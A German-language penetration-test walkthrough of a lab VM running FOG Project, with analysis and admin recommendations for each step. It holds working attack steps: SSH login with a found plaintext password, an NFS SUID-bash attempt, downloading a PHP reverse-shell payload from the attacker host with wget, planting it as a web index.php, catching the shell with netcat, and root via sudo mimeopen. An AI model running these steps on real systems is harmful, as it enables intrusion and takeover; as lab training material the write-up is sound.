+<span class="command">uid=1001(fogproject) gid=1001(fogproject) groups=1001(fogproject)</span>
+$
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich per SSH (`ssh`) als Benutzer `fogproject` am Zielsystem (`zday.vm`, also `192.168.2.145`) anzumelden. Das Passwort `84D1gia!8M9HSsR8gXau`, das zuvor in der FOG-Weboberfläche gefunden wurde, wird verwendet. Die Option `-t /bin/sh` versucht, direkt eine `/bin/sh`-Shell zu starten, was manchmal bei eingeschränkten Umgebungen nützlich ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch! Der SSH-Login war erfolgreich. Wir haben nun einen initialen Zugriff auf das System als Benutzer `fogproject`. Der `id`-Befehl bestätigt unsere Benutzer-ID (1001), Gruppen-ID (1001) und Gruppenzugehörigkeiten. Dies ist ein entscheidender Durchbruch.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe grundlegende Enumeration auf dem Zielsystem durch: `uname -a` (Kernel-Version), `ls -la /home`, `sudo -l` (Prüfung auf sudo-Rechte), `find / -perm -4000 2>/dev/null` (Suche nach SUID-Dateien), `ps aux` (laufende Prozesse). Suche nach weiteren Zugangsdaten in Konfigurationsdateien oder im Home-Verzeichnis von `fogproject`. Versuche, die zuvor entdeckten NFS-Shares vom Zielsystem selbst aus zu untersuchen.<br><strong>Empfehlung (Admin):</strong> Verhindere die Wiederverwendung von Passwörtern über verschiedene Dienste hinweg. Überwache SSH-Logins auf verdächtige Aktivitäten. Erwäge die Deaktivierung der Passwort-Authentifizierung für SSH und erzwinge die Verwendung von SSH-Schlüsseln. Beschränke die Rechte des `fogproject`-Benutzers auf das absolut Notwendige.</p>
+
+            <p class="analysis"><strong>Analyse des NFS-SUID-Versuchs:</strong> Die folgenden Befehle repräsentieren einen Versuch, über die NFS-Freigabe `/images/dev` Root-Rechte zu erlangen. Die Idee ist, eine Shell (wie `/bin/bash`) auf die NFS-Freigabe zu kopieren, das SUID-Bit darauf zu setzen und sie dann vom Zielsystem als `fogproject` auszuführen. Wenn die NFS-Freigabe ohne `no_root_squash` gemountet ist, könnte die SUID-Bash mit Root-Rechten ausgeführt werden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mkdir /tmp/temp</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System (Kali) wird ein temporäres Verzeichnis `/tmp/temp` erstellt, das als Mountpunkt für die NFS-Freigabe dienen soll.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein notwendiger Vorbereitungsschritt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass das Verzeichnis leer ist und die Berechtigungen korrekt sind.<br><strong>Empfehlung (Admin):</strong> Keine direkten Maßnahmen erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mount -t nfs 192.168.2.145:/images/dev /tmp/temp</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die NFS-Freigabe `/images/dev` vom Zielsystem (`192.168.2.145`) wird auf dem Angreifer-System in das Verzeichnis `/tmp/temp` gemountet. Der Typ (`-t nfs`) wird explizit angegeben.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Mount-Vorgang scheint erfolgreich gewesen zu sein (keine Fehlermeldung). Dies bestätigt, dass die NFS-Freigabe vom Angreifer-System aus zugänglich ist.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe den Inhalt des gemounteten Verzeichnisses (`ls -lah /tmp/temp`).<br><strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, beschränke den NFS-Zugriff auf vertrauenswürdige Hosts.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/tmp/temp]
+└─# <span class="command">cp /bin/bash .</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Bash-Shell (`/bin/bash`) vom Angreifer-System wird in das gemountete NFS-Verzeichnis (`/tmp/temp`, was `/images/dev` auf dem Zielsystem entspricht) kopiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Vorbereitungsschritt für den SUID-Exploit-Versuch.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine.<br><strong>Empfehlung (Admin):</strong> Überwache Schreibzugriffe auf NFS-Freigaben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/tmp/temp]
+└─# <span class="command">ls</span></div>
+                    <pre>bash  postinitscripts</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Listet den Inhalt des NFS-Verzeichnisses auf. Zeigt die kopierte `bash`-Datei und ein vorhandenes Verzeichnis `postinitscripts`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass die Datei kopiert wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche auch das `postinitscripts`-Verzeichnis.<br><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/tmp/temp]
+└─# <span class="command">chmod +s bash</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das SUID-Bit (`+s`) wird auf die kopierte `bash`-Datei im NFS-Verzeichnis gesetzt. Wenn eine Datei das SUID-Bit hat, wird sie mit den Rechten des Dateibesitzers ausgeführt, nicht mit den Rechten des Benutzers, der sie startet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der Kern des Exploit-Versuchs. Wenn der NFS-Server `root_squash` nicht aktiviert hat, bleibt der Besitzer der Datei `root` (da sie als `root` vom Kali-System kopiert und modifiziert wurde), und das SUID-Bit wird auf dem Zielsystem respektiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfe die Berechtigungen mit `ls -lah`.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass NFS-Exporte standardmäßig mit `root_squash` (oder `all_squash`) konfiguriert sind. Dies verhindert, dass vom Client als Root erstellte Dateien auf dem Server Root-Rechte behalten.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/tmp/temp]
+└─# <span class="command">ls -lah</span></div>
+                    <pre>
+insgesamt 1,3M
+drwxrwxrwx  3 <span class="command">1001 root</span> 4,0K 12. Sep 11:10 .
+drwxrwxrwt 18 root root 4,0K 12. Sep 11:09 ..
+<span class="password">-rwsr-sr-x  1 root root 1,3M 12. Sep 11:10 bash</span> <span class="password"><-- SUID und GUID Bits gesetzt, Besitzer ist root!</span>
+-rwxrwxrwx  1 1001 root    0 10. Mär 2021  .mntcheck
+drwxrwxrwx  2 1001 root 4,0K 10. Mär 2021  postinitscripts
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die Ausgabe von `ls -lah` im gemounteten NFS-Verzeichnis auf dem Angreifer-System zeigt die Berechtigungen der Dateien.
+*   Die `bash`-Datei hat nun die Berechtigungen `-rwsr-sr-x`. Das erste `s` steht für das SUID-Bit (statt `x` in der Besitzer-Spalte) und das zweite `s` für das GUID-Bit (statt `x` in der Gruppen-Spalte).
+*   Entscheidend ist, dass der Besitzer der Datei `root` ist und die Gruppe ebenfalls `root`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Aus Sicht des Angreifer-Systems sieht alles korrekt für den Exploit aus. Das SUID-Bit ist gesetzt, und der Besitzer ist `root`. Wenn der NFS-Server `root_squash` deaktiviert hat, sollte das Ausführen dieser Datei auf dem Zielsystem eine Root-Shell geben.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsle zur SSH-Shell auf dem Zielsystem (`fogproject@zday.vm`) und versuche, die SUID-Bash auszuführen (`/pfad/zum/nfs/mount/images/dev/bash -p`). Die Option `-p` versucht, die effektiven Rechte (Root) beizubehalten.<br><strong>Empfehlung (Admin):</strong> Überprüfe die NFS-Export-Optionen auf dem Server (`/etc/exports`) und stelle sicher, dass `root_squash` aktiv ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">$ <span class="command">cd images/dev</span></div>
+                    <div class="prompt">$ <span class="command">ls -lah</span></div>
+                    <pre>
+drwxrwxrwx 3 <span class="command">fogproject root</span> 4.0K Sep 12 05:10 .
+drwxrwxrwx 4 fogproject root 4.0K Mar 10  2021 ..
+<span class="password">-rwsr-sr-x 1 root       root 1.3M Sep 12 05:10 bash</span> <span class="password"><-- Sieht immer noch gut aus!</span>
+-rwxrwxrwx 1 fogproject root    0 Mar 10  2021 .mntcheck
+drwxrwxrwx 2 fogproject root 4.0K Mar 10  2021 postinitscripts
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Nun wird der Inhalt des NFS-Verzeichnisses `/images/dev` direkt vom Zielsystem aus (in der `fogproject`-Shell) betrachtet. Der Pfad ist hier relativ, vermutlich wurde zuvor in das übergeordnete Mount-Verzeichnis gewechselt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die `ls -lah`-Ausgabe auf dem Zielsystem bestätigt, dass die `bash`-Datei immer noch `root` als Besitzer hat und das SUID-Bit (`s`) gesetzt ist. Das ist ein gutes Zeichen für den Angreifer und deutet darauf hin, dass `root_squash` tatsächlich deaktiviert sein könnte.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe die SUID-Bash aus: `./bash -p`.<br><strong>Empfehlung (Admin):</strong> Dringend `root_squash` aktivieren!</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">$ <span class="command">./bash -p</span></div>
+                    <pre>
+<span class="comment">leider klappt das rooten auf die art nicht da die Box zu alt ist,</span>
+
+<span class="password">./bash: /lib/x86_64-linux-gnu/libm.so.6: version `GLIBC_2.29' not found (required by ./bash)</span>
+<span class="password">./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./bash)</span>
+<span class="password">./bash: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by ./bash)</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Versuch, die SUID-Bash (`./bash -p`) auf dem Zielsystem auszuführen, schlägt fehl. Der Grund sind fehlende Abhängigkeiten. Die Bash-Version vom Angreifer-System (vermutlich ein aktuelles Kali Linux) benötigt neuere Versionen der GNU C Library (GLIBC), als auf dem Zielsystem (Debian 10 laut Nmap) installiert sind.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der SUID-Exploit-Versuch über NFS ist an einer Inkompatibilität der Binärdateien gescheitert, nicht notwendigerweise an der NFS-Konfiguration selbst. Obwohl `root_squash` möglicherweise deaktiviert war, konnte die eingeschleuste Bash nicht ausgeführt werden. Dies ist ein häufiges Problem, wenn Binärdateien zwischen unterschiedlich alten Systemen kopiert werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, eine statisch gelinkte Shell zu kompilieren oder zu finden, die keine externen Bibliotheken benötigt. Alternativ kann versucht werden, eine Shell zu verwenden, die mit einer älteren GLIBC-Version kompatibel ist, oder eine einfache C-SUID-Wrapper-Anwendung zu schreiben, die `setuid(0); setgid(0); system("/bin/sh");` ausführt und auf dem Zielsystem kompiliert wird (falls ein Compiler vorhanden ist). Da dies fehlschlug, müssen andere Wege zur Rechteausweitung gesucht werden.<br><strong>Empfehlung (Admin):</strong> Obwohl dieser spezielle Versuch fehlschlug, bleibt die Empfehlung bestehen: `root_squash` für NFS-Exporte aktivieren. Halte das System und seine Bibliotheken (wie GLIBC) aktuell, aber beachte, dass dies diesen speziellen Angriffsvektor nicht unbedingt verhindert hätte.</p>
+
+
+             <p class="analysis"><strong>Analyse der Reverse Shell:</strong> Da der SUID-Versuch fehlschlug, wird nun versucht, eine Reverse Shell über eine Schwachstelle in der Webanwendung zu erlangen. Dies beinhaltet das Hochladen einer PHP-Webshell und das Auslösen dieser Shell, um eine Verbindung zum Angreifer zurück aufzubauen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 4444</span></div>
+                    <pre>Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+<span class="password">192.168.2.145 - - [12/Sep/2022 11:41:38] "GET /image.php HTTP/1.1" 200 -</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein einfacher Python-HTTP-Server auf Port 4444 gestartet. Dieser dient dazu, Dateien für das Zielsystem zum Download bereitzustellen. Die Logzeile zeigt später, dass das Zielsystem (`192.168.2.145`) erfolgreich die Datei `image.php` heruntergeladen hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Standardverfahren, um Dateien auf ein Zielsystem zu übertragen, wenn ein einfacher Webserver benötigt wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stelle sicher, dass sich die zu übertragende Datei (`image.php`) im selben Verzeichnis befindet, von dem aus der Python-Server gestartet wird.<br><strong>Empfehlung (Admin):</strong> Firewall-Regeln können ausgehende Verbindungen vom Server einschränken, um das Herunterladen von Payloads zu erschweren. Dies ist jedoch oft schwierig umzusetzen, ohne legitime Funktionen zu beeinträchtigen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">$ <span class="command">cd /tmp</span></div>
+                    <div class="prompt">$ <span class="command">wget http://192.168.2.140:4444/image.php</span></div>
+                    <pre>
+--2022-10-11 06:25:37--  http://192.168.2.140:4444/image.php
+Connecting to 192.168.2.140:4444... <span class="password">connected.</span>
+HTTP request sent, awaiting response... <span class="password">200 OK</span>
+Length: 5495 (5.4K) [application/octet-stream]
+Saving to: ‘image.php’
+
+image.php                     100%[===================================>]   5.37K  --.-KB/s    in 0s
+
+<span class="password">2022-10-11 06:25:37 (XXX MB/s) - ‘image.php’ saved [5495/5495]</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> In der SSH-Shell auf dem Zielsystem (`fogproject@zday.vm`) wird in das `/tmp`-Verzeichnis gewechselt. Mit `wget` wird die Datei `image.php` vom Python-HTTP-Server des Angreifers (`192.168.2.140:4444`) heruntergeladen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download war erfolgreich. Die Datei `image.php` befindet sich nun im `/tmp`-Verzeichnis auf dem Zielsystem. Es ist davon auszugehen, dass `image.php` eine PHP-Webshell oder ein Reverse-Shell-Payload enthält.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Platziere die heruntergeladene PHP-Datei in einem Verzeichnis, das vom Webserver (Apache) ausgeführt wird.<br><strong>Empfehlung (Admin):</strong> Beschränke die Möglichkeit für Benutzer wie `fogproject`, Dateien herunterzuladen oder auszuführen, falls nicht unbedingt erforderlich. Überwache ausgehende Netzwerkverbindungen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">$ <span class="command">cp image.php /var/www/html/fog/service/ipxe/index.php</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die heruntergeladene Datei `image.php` wird in das Web-Verzeichnis `/var/www/html/fog/service/ipxe/` kopiert und dabei in `index.php` umbenannt. Das iPXE-Verzeichnis im FOG-Projekt ist oft über das Netzwerk erreichbar und dient zum Booten von Clients.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein kritischer Schritt. Indem die originale `index.php` im iPXE-Verzeichnis durch die PHP-Webshell (`image.php`) ersetzt wird, kann der Angreifer nun versuchen, diese Shell über den Webserver auszuführen. Der Benutzer `fogproject` scheint Schreibrechte in diesem Verzeichnis zu haben, was eine Fehlkonfiguration darstellt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starte einen Listener auf dem Angreifer-System, um die eingehende Reverse-Shell-Verbindung aufzufangen. Rufe dann die URL `http://zday.vm/fog/service/ipxe/index.php` (oder HTTPS) auf, um die hochgeladene PHP-Shell auszuführen.<br><strong>Empfehlung (Admin):</strong> Überprüfe die Dateiberechtigungen im Web-Verzeichnis. Der Webserver-Benutzer (`www-data`) benötigt Lesezugriff, aber andere Benutzer (wie `fogproject`) sollten keine Schreibrechte auf Anwendungsdateien haben, es sei denn, es ist absolut notwendig und entsprechend abgesichert. Implementiere File Integrity Monitoring (FIM), um unerwartete Änderungen an Webdateien zu erkennen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                    <pre>listening on [any] 9001 ...</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener (`nc`) gestartet, der auf Port 9001 auf eingehende Verbindungen wartet.
+*   `-l`: Listen-Modus.
+*   `-v`: Verbose-Modus (mehr Ausgaben).
+*   `-n`: Numerische IP-Adressen (kein DNS).
+*   `-p 9001`: Portnummer.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Listener ist bereit, die eingehende Verbindung von der Reverse Shell entgegenzunehmen, die vermutlich in `image.php` kodiert ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Halte dieses Terminal offen und fahre mit dem Auslösen der Webshell fort.<br><strong>Empfehlung (Admin):</strong> Ausgehende Verbindungen vom Webserver auf ungewöhnliche Ports wie 9001 sollten durch eine Firewall blockiert werden.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://zday.vm/fog/service/ipxe/index.php"</span></div>
+                     <pre><span class="comment">(Keine direkte Ausgabe, aber löst die Shell auf dem Server aus)</span></pre>
+                </div>
+            </div>
+              <p class="analysis"><strong>Analyse:</strong> Mit `curl` wird vom Angreifer-System aus die URL aufgerufen, unter der die PHP-Shell (`image.php`, umbenannt in `index.php`) platziert wurde. Dies veranlasst den Apache-Webserver auf dem Zielsystem, das PHP-Skript auszuführen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl löst den Reverse-Shell-Payload aus. Das PHP-Skript verbindet sich nun zurück zum Netcat-Listener des Angreifers auf Port 9001.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wechsle zum Netcat-Listener-Fenster, um die eingegangene Shell zu sehen.<br><strong>Empfehlung (Admin):</strong> Überwache Webserver-Logs auf Zugriffe auf verdächtige Dateien oder Pfade. Analysiere ausgehende Verbindungen vom Webserver.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt metasploit-prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">nc -lvnp 9001</span> <span class="comment"> (Fortsetzung des vorherigen Listeners)</span></div>
+                    <pre>
+listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.145] 33856</span> <span class="password"><-- Verbindung erhalten!</span>
+Linux zday 4.19.0-14-amd64 #1 SMP Debian 4.19.171-2 (2021-01-30) x86_64 GNU/Linux
+ 06:28:56 up 19 min,  1 user,  load average: 0.00, 0.28, 0.43
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+fogproje pts/0    192.168.2.140    06:12    2:03   0.00s  0.00s /bin/sh
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span> <span class="password"><-- Shell als www-data!</span>
+/bin/sh: 0: can't access tty; job control turned off
+$ <span class="comment">(Einfache Shell erhalten)</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener auf dem Angreifer-System zeigt die eingehende Verbindung vom Zielsystem (`192.168.2.145`). Es werden einige Systeminformationen (Kernel, Uptime) ausgegeben, und entscheidend ist die Zeile `uid=33(www-data)`. Wir haben nun eine Shell auf dem Zielsystem.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Wir haben eine Reverse Shell erlangt. Allerdings läuft diese Shell als Benutzer `www-data`, der typische Benutzer für den Apache-Webserver. Dieser Benutzer hat normalerweise eingeschränkte Rechte. Die Shell ist zudem eine einfache `/bin/sh` ohne volle Terminal-Funktionalität (TTY), wie die Meldung "/bin/sh: 0: can't access tty" anzeigt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell, um volle Terminal-Funktionalität (wie Tab-Vervollständigung, Pfeiltasten) zu erhalten. Führe danach die Enumeration aus der Sicht von `www-data` durch, insbesondere `sudo -l`, um zu sehen, ob `www-data` spezielle `sudo`-Rechte hat.<br><strong>Empfehlung (Admin):</strong> Minimiere die Rechte des Webserver-Benutzers (`www-data`). Stelle sicher, dass er keine unnötigen Schreibrechte hat und keine Befehle über `sudo` ausführen kann, es sei denn, dies ist absolut notwendig und sicher implementiert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">$ <span class="command">id</span></div>
+                    <pre><span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+                    <div class="prompt">$ <span class="command">python3 -c 'import pty; pty.spawn("/bin/bash")'</span></div>
+                     <div class="prompt">www-data@zday:/$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt">www-data@zday:/$ <span class="comment">(Vollständige Bash-Shell)</span></div>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der `id`-Befehl bestätigt erneut, dass wir als `www-data` agieren. Anschließend wird Python 3 verwendet, um eine vollständig interaktive Bash-Shell zu spawnen (`pty.spawn`). Dies ist ein gängiger Trick, um einfache Shells (wie die von Netcat erhaltene) aufzuwerten. Mit `export TERM=xterm` wird die Terminal-Emulation korrekt gesetzt, sodass Programme wie `clear` oder Texteditoren funktionieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Shell wurde erfolgreich stabilisiert. Wir haben jetzt eine voll funktionsfähige Bash-Shell als Benutzer `www-data`, was die weitere Enumeration und Interaktion mit dem System erheblich erleichtert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Privilege Escalation Enumeration aus der Sicht von `www-data`. Prüfe `sudo -l`, SUID-Dateien, Cronjobs, Kernel-Exploits, unsichere Dateiberechtigungen etc.<br><strong>Empfehlung (Admin):</strong> Idealerweise sollte Python 3 nicht für den Webserver-Benutzer verfügbar sein, wenn es nicht benötigt wird. Die Möglichkeit, eine PTY-Shell zu spawnen, ist jedoch schwer zu verhindern, solange eine Skriptsprache verfügbar ist.</p>
+
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <p class="analysis"><strong>Analyse:</strong> Nach dem Erhalt einer stabilen Shell als `www-data` ist das nächste Ziel, die Rechte auf dem System zu erhöhen, idealerweise auf `root`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Privilege Escalation ist oft der komplexeste Teil eines Penetrationstests und erfordert sorgfältige Enumeration und das Ausnutzen von Fehlkonfigurationen oder Schwachstellen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">www-data@zday:/var/www/html/fog/service/ipxe$ <span class="command">sudo -l</span></div>
+                    <pre>
+Matching Defaults entries for www-data on zday:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on zday:
+    <span class="password">(estas) NOPASSWD: /usr/bin/dash</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `sudo -l` wird ausgeführt, um zu überprüfen, welche Befehle der aktuelle Benutzer (`www-data`) mit `sudo` (also potenziell mit Rechten anderer Benutzer) ausführen darf.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein bedeutender Fund! Die Ausgabe zeigt, dass `www-data` den Befehl `/usr/bin/dash` als Benutzer `estas` ohne Passwortabfrage (`NOPASSWD`) ausführen darf. `dash` ist eine einfache Shell (Debian Almquist Shell). Das bedeutet, wir können ohne Passwort eine Shell als Benutzer `estas` erhalten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den Befehl `sudo -u estas /usr/bin/dash` aus, um eine Shell als Benutzer `estas` zu erhalten. Untersuche dann die Rechte und das Home-Verzeichnis von `estas`.<br><strong>Empfehlung (Admin):</strong> Gewähre `sudo`-Rechte nur, wenn absolut notwendig und nach dem Prinzip der geringsten Rechte. Die Erlaubnis für `www-data`, eine Shell als ein anderer Benutzer zu starten, ist extrem gefährlich und sollte vermieden werden. Wenn ein spezifischer Befehl benötigt wird, sollte dieser so eingeschränkt wie möglich sein und keine Shell-Escapes erlauben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">www-data@zday:/var/www/html/fog/service/ipxe$ <span class="command">sudo -u estas /usr/bin/dash</span></div>
+                     <div class="prompt">$ <span class="command">id</span></div>
+                    <pre>
+<span class="command">uid=1000(estas) gid=1000(estas) groups=1000(estas),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)</span>
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der zuvor identifizierte `sudo`-Befehl wird ausgeführt. `sudo -u estas` führt den nachfolgenden Befehl (`/usr/bin/dash`) als Benutzer `estas` aus. Wir erhalten eine neue Shell (`$`). Der `id`-Befehl bestätigt, dass wir nun als Benutzer `estas` (UID 1000) agieren.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreicher horizontaler Rechtewechsel. Wir haben uns vom `www-data`-Benutzer zum Benutzer `estas` bewegt. Dies ist ein Fortschritt, da `estas` möglicherweise mehr Rechte oder Zugriff auf interessantere Dateien hat als `www-data`.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe erneut Enumerationsschritte als `estas` durch: `sudo -l`, `ls -lah /home/estas`, Suche nach interessanten Dateien, Cronjobs etc. Suche nach der User-Flag, die sich oft im Home-Verzeichnis des ersten "echten" Benutzers befindet.<br><strong>Empfehlung (Admin):</strong> Überprüfe die Notwendigkeit des `estas`-Benutzers und seiner Gruppenzugehörigkeiten. Stelle sicher, dass er keine unnötigen `sudo`-Rechte hat.</p>
+
+        </section>
+
+        <section id="poc">
+           <h2>Proof of Concept: Privilege Escalation via mimeopen</h2>
+           <p class="analysis"><strong>Analyse:</strong> Nach dem Wechsel zum Benutzer `estas` wird weiter nach Wegen zur Eskalation auf `root` gesucht. Der folgende Abschnitt beschreibt die Ausnutzung einer Fehlkonfiguration im Zusammenhang mit `sudo` und `mimeopen`.</p>
+           <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Schritt zur vollständigen Kompromittierung des Systems.</p>
+
+           <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">estas@zday:/tmp$ <span class="command">cd /tmp</span></div>
+                    <div class="prompt">estas@zday:/tmp$ <span class="command">echo bash > tmpfile</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `estas` wird in das `/tmp`-Verzeichnis gewechselt. Mit `echo bash > tmpfile` wird eine einfache Textdatei namens `tmpfile` erstellt, die nur das Wort "bash" enthält.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein einfacher Vorbereitungsschritt für den nächsten Befehl.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine.<br><strong>Empfehlung (Admin):</strong> Das `/tmp`-Verzeichnis sollte idealerweise mit Optionen wie `noexec` und `nosuid` gemountet werden, um das Ausführen von Skripten oder SUID-Binaries aus diesem Verzeichnis zu verhindern, obwohl dies diesen spezifischen Exploit nicht stoppen würde.</p>
+
+           <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">estas@zday:/tmp$ <span class="command">sudo mimeopen -d tmpfile</span></div>
+                    <pre>
+Please choose a default application for files of type text/plain
+
+	1) Vim  (vim)
+	2) Other... (Type a command)
+
+use application #<span class="command">2</span>
+use command: <span class="command">bash</span>
+<span class="password">bash</span> <span class="password"><-- Befehl wird ausgeführt!</span>
+                    </pre>
+                     <div class="prompt">root@zday:/tmp# <span class="comment">(Root-Shell erhalten!)</span></div>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird die eigentliche Schwachstelle ausgenutzt.
+1.  Es wird `sudo mimeopen -d tmpfile` ausgeführt. Zuvor muss bei der Enumeration als `estas` festgestellt worden sein, dass `estas` den Befehl `mimeopen` via `sudo` (vermutlich als `root`) ausführen darf (z.B. durch `sudo -l`). Diese Information fehlt im Log, ist aber implizit notwendig.
+2.  `mimeopen -d` fragt interaktiv nach einer Standardanwendung für den Dateityp der angegebenen Datei (`tmpfile`, was `text/plain` ist).
+3.  Der Angreifer wählt Option `2` ("Other...").
+4.  Auf die Frage "use command:" gibt der Angreifer `bash` ein.
+5.  Da `mimeopen` via `sudo` (also mit Root-Rechten) läuft, wird der eingegebene Befehl (`bash`) ebenfalls mit Root-Rechten ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Fantastisch, der Exploit war erfolgreich! Durch die unsichere `sudo`-Regel, die es `estas` erlaubt, `mimeopen` als `root` auszuführen, konnte eine beliebige Anwendung (in diesem Fall `bash`) mit Root-Rechten gestartet werden. Wir haben nun eine Root-Shell und damit die vollständige Kontrolle über das System erlangt.</p>
